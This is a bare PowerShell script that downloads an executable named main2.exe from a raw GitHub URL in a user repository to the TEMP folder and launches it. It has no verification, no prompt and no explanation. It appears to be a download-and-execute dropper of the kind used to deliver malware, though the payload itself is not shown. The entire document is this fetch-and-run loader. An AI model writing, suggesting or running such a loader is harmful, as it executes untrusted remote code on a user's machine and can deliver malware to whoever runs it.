# ===== CONFIG =====
$exeUrl = "https://raw.githubusercontent.com/lubyralph6-maker/godpum.ps1/main/main2.exe"

# ===== TEMP PATH =====
$tempExe = "$env:TEMP\main2.exe"

# ===== DOWNLOAD =====
Invoke-WebRequest -Uri $exeUrl -OutFile $tempExe

# ===== CHECK =====
if (Test-Path $tempExe) {

    Write-Host "Downloaded"

    # ===== RUN =====
    Start-Process $tempExe

}
else {

    Write-Host "Download failed"

}
